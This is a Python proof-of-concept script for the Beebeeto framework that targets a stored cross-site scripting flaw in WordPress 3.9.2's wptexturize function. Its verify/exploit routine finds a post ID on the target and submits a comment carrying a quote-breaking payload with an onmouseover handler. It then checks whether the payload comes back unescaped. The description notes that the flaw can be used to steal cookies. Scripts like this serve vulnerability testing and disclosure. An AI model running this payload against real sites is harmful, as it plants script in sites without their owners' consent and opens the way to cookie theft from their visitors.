#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import random
import string
import requests

from baseframe import BaseFrame

# test on localhost

class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0167',
            'name': 'Wordpress 3.9.2 /wp-includes/formatting.php XSS漏洞 POC',
            'author': 'flsf',
            'create_date': '2014-11-27',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Wordpress',
            'vul_version': ['3.9.2'],
            'type': 'Cross Site Scripting',
            'tag': ['Wordpress漏洞', '/wp-includes/formatting.php', 'Cross Site Scripting', 'php'],
            'desc': '''
                    /wp-includes/formatting.php 中 wptexturize 函数在处理标签时过滤不严导致双引号重组绕过，
                    最终导致 XSS 漏洞,可以获取 Cookie。
                    ''',
            'references': ['http://www.darknet.org.uk/2014/11/critical-xss-flaw-affects-wordpress-3-9-2-earlier/',
                           ],
        },
    }

    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + "/wp-comments-post.php"

        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url

        rand_str = lambda length: ''.join(random.sample(string.letters, length))
        try:
            post_id = re.search(r'post-(?P<post_id>[\d]+)', requests.get(args['options']['target']).content).group('post_id')
        except:
            return args
        flag = rand_str(10)
        payload = {
            'author': rand_str(10),
            'email': '%s@%s.com' % (rand_str(10), rand_str(3)),
            'url': '',
            'comment': '[<a href="xxx" title="]"></a>[" <!-- onmouseover="alert(/moemoe/)"><!-- -->%s<a></a>]"' % flag,
            'comment_post_ID': post_id,
            'comment_parent': 0,
        }

        content = requests.post(verify_url, data=payload).content

        if 'onmouseover="alert(/moemoe/)"&gt; -->%s' % flag in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == "__main__":
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())